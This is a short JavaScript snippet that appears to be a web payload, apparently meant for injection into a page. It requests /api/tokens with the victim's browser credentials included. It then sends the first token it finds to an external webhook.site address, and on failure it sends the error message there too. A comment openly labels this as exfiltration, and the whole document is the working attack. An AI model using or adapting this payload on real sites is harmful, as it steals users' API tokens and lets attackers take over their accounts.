fetch("/api/tokens?limit=100", {
  method: "GET",
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  const tokens = data?.map?.(t => t.token).filter(Boolean);
  if (tokens && tokens.length) {
    // Exfiltrate the first token
    const exfil = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?token=" + encodeURIComponent(tokens[0]);
    new Image().src = exfil;
  }
})
.catch(e => {
  new Image().src = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?error=" + encodeURIComponent(e.message);
});
